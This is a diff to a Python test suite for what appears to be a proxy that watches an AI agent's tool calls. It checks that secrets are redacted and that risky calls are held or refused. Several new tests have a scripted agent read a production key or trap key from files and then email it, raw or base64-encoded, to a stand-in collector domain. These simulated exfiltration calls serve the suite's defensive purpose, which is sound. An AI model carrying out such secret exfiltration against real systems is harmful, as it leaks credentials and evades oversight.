@@ -1,7 +1,9 @@
 """The proxy over real HTTP: a uvicorn server in a thread, fastmcp's client as the agent."""
 
 import asyncio
+import base64
 import json
+import time
 from collections.abc import Mapping
 from datetime import UTC, datetime, timedelta
 
@@ -12,8 +14,17 @@ from cressey.domain.runs import Mandate, Risk
 from cressey.engine import decide
 from cressey.engine.agent_text import WAY_OUT, fallback, finish
 from cressey.llm.clients import ModelUnavailable
-from cressey.scan.secrets import redact
-from cressey.testing import QuietJudge, agent, api, next_hold, no_to_all, serving, users
+from cressey.scan.secrets import hide, scan
+from cressey.testing import (
+    QuietJudge,
+    agent,
+    api,
+    next_hold,
+    no_to_all,
+    serving,
+    traced_incidents,
+    users,
+)
 
 pytestmark = pytest.mark.anyio
 TASK = "fais passer les tests avant la mise en prod de ce soir"
@@ -163,6 +174,98 @@ async def test_secret_values_never_leave_through_the_api(served):
     assert all(PROD_KEY not in text for text in [json.dumps(hold), *pages])
     read, sql = await steps(served, run)
     assert read["secrets"][0]["name"] == "DB_PROD_KEY" and "[secret:" in sql["args"]
+
+
+async def test_a_secret_in_a_recipient_never_shows_in_the_hold_reason(served):
+    """Audit finding 17: the egress rule names the recipient in the reason, and the reasons
+    were kept as the floor made them while the arguments were redacted."""
+    # The key as it is, then in base64 with no padding, with one = and with two.
+    recipients = [PROD_KEY] + [
+        base64.b64encode(f"{prefix}{PROD_KEY}".encode()).decode()
+        for prefix in ("", "k=", "key=")
+    ]
+    run = await new_run(served, {"may_send_to": ["@example.test"]}, kind="control")
+    async with agent(served, run["key"]) as a:
+        await a.call_tool("read_file", {"path": ".env.prod"})
+        for who in recipients:
+            mail = {"to": f"{who}@collector.invalid", "subject": "s", "body": "b"}
+            await a.call_tool("send_email", mail)
+    pages = {
+        "run": (await api(served, "GET", f"/api/runs/{run['id']}")).text,
+        "incidents": json.dumps(await traced_incidents(served)),
+    }
+    leaks = [
+        path for path, text in pages.items() if any(who in text for who in recipients)
+    ]
+    assert leaks == []
+    _, *mails = await steps(served, run)
+    assert [s["status"] for s in mails] == ["would_hold"] * len(recipients)
+    assert all("[secret:" in s["reason"] for s in mails)
+
+
+async def test_a_secret_only_the_calls_own_scan_finds_never_shows_in_the_hold_reason(
+    served,
+):
+    """The scan of the whole call finds a value its body names (`api_key: ...`), and the
+    arguments hide it; the reason names it as a recipient and hid only what the run knew.
+    Text follows the value in the body: the scan reads the call as one JSON line, so a value
+    that ends it comes out with the closing quote."""
+    unseen = "unseen-value-4242"  # this run never read it
+    run = await new_run(served, {"may_send_to": ["@example.test"]}, kind="control")
+    mail = {
+        "to": f"{unseen}@collector.invalid",
+        "subject": "s",
+        "body": f"api_key: {unseen} (rotated)",
+    }
+    async with agent(served, run["key"]) as a:
+        await a.call_tool("send_email", mail)
+    pages = {
+        "run": (await api(served, "GET", f"/api/runs/{run['id']}")).text,
+        "incidents": json.dumps(await traced_incidents(served)),
+    }
+    assert [path for path, text in pages.items() if unseen in text] == []
+    [step] = await steps(served, run)
+    assert "[secret:" in step["reason"]
+
+
+async def test_a_trap_key_the_scan_missed_never_shows_in_an_incident_source(
+    served, tmp_path
+):
+    """The engine hides a call with the trap keys as well, and so must the incident that
+    traces where its values were read: here no scan flagged the key, so no run knows it."""
+    notes = tmp_path / "workspace" / "notes.txt"
+    notes.write_text(f"legacy admin login {TRAP_KEY} (old)\n")
+    run = await new_run(served, {"may_send_to": ["@example.test"]}, kind="control")
+    async with agent(served, run["key"]) as a:
+        await a.call_tool("read_file", {"path": "notes.txt"})
+        mail = {"to": f"{TRAP_KEY}@collector.invalid", "subject": "s", "body": "b"}
+        await a.call_tool("send_email", mail)
+    [incident] = await traced_incidents(served)
+    assert [s["step"] for s in incident["sources"]] == [1]  # traced to the read
+    assert TRAP_KEY not in json.dumps(incident)
+
+
+async def test_a_value_only_the_calls_own_scan_finds_never_shows_in_an_incident_source(
+    served, tmp_path
+):
+    """The arguments hide what the scan of the whole call finds (`api_key: ...`), and so must
+    the incident's sources: the run read the value in plain text, which no scan flagged."""
+    unseen = "unseen-value-4242"
+    (tmp_path / "workspace" / "ops.txt").write_text(
+        f"rotation value {unseen} from ops\n"
+    )
+    run = await new_run(served, {"may_send_to": ["@example.test"]}, kind="control")
+    mail = {
+        "to": f"{unseen}@collector.invalid",
+        "subject": "s",
+        "body": f"api_key: {unseen} (rotated)",
+    }
+    async with agent(served, run["key"]) as a:
+        await a.call_tool("read_file", {"path": "ops.txt"})
+        await a.call_tool("send_email", mail)
+    [incident] = await traced_incidents(served)
+    assert [s["step"] for s in incident["sources"]] == [1]  # traced to the read
+    assert unseen not in json.dumps(incident)
 
 
 async def test_a_hold_shows_its_deadline_and_the_decision_its_time(served):
@@ -324,7 +427,7 @@ async def test_the_demo_incident_from_hold_to_guides(served):
         await a.call_tool("read_file", {"path": ".env.prod"})
         call = asyncio.create_task(a.call_tool("run_sql", DELETE, raise_on_error=False))
         hold = await next_hold(served)
-        [incident] = (await api(served, "GET", "/api/incidents")).json()
+        [incident] = await traced_incidents(served)
         n = hold["step"]["n"]
         await api(served, "POST", f"/api/runs/{run['id']}/steps/{n}/reject")
         await call
@@ -378,15 +481,20 @@ async def test_arguments_are_redacted_off_the_event_loop(served, monkeypatch):
     """Stress test F5: a large argument's redaction stalled every run on the event loop."""
     on_loop: list[bool] = []
 
-    def spy(text: str, known: Mapping[str, str] | None = None) -> str:
-        try:
-            asyncio.get_running_loop()
-            on_loop.append(True)
-        except RuntimeError:
-            on_loop.append(False)
-        return redact(text, known)
+    def off_loop(real):
+        def spy(*args):
+            try:
+                asyncio.get_running_loop()
+                on_loop.append(True)
+            except RuntimeError:
+                on_loop.append(False)
+            return real(*args)
 
-    monkeypatch.setattr(decide, "redact", spy)
+        return spy
+
+    # What the engine runs on the arguments: the scan of the call, then the hiding.
+    monkeypatch.setattr(decide, "scan", off_loop(scan))
+    monkeypatch.setattr(decide, "hide", off_loop(hide))
     run = await new_run(served)
     async with agent(served, run["key"]) as a:
         await a.call_tool("write_file", {"path": "a.txt", "content": "x" * 100_000})
@@ -616,6 +724,35 @@ async def test_on_fleet_stop_a_target_several_runs_went_after_is_refused_at_once
     assert r.content[0].text == f"Cressey: action refused. {WAY_OUT}"
     [step] = await steps(served, third)
     assert step["status"] == "denied"
+
+
+async def test_on_fleet_stop_a_parallel_call_of_the_run_that_raised_the_signal_is_refused(
+    served, monkeypatch
+):
+    """The signal, the stop and the run's suspension are one step with the incident's
+    opening: a call in parallel can't slip through while the incident's trace runs."""
+    await responses(served, fleet="stop")
+    read = {"query": "SELECT * FROM users", "key": TRAP_KEY}  # flagged, not held
+    for _ in range(2):  # two runs flagged for it: the fleet is one short
+        run = await new_run(served)
+        async with agent(served, run["key"]) as a:
+            await a.call_tool("run_sql", read, raise_on_error=False)
+
+    def slow(call, reads):
+        time.sleep(0.3)  # the trace of the third run's incident, a big call's
+        return []
+
+    monkeypatch.setattr("cressey.incidents.incidents.trace", slow)
+    third = await new_run(served)
+    async with agent(served, third["key"]) as a:
+        results = await asyncio.gather(
+            a.call_tool("run_sql", read, raise_on_error=False),
+            a.call_tool("run_sql", read, raise_on_error=False),
+        )
+    assert all(r.is_error for r in results)
+    assert [s["status"] for s in await steps(served, third)] == ["denied", "denied"]
+    incidents = await traced_incidents(served)
+    assert len([i for i in incidents if i["run_id"] == third["id"]]) == 1  # one per key
 
 
 async def test_on_stop_a_trap_key_is_refused_at_once(served):
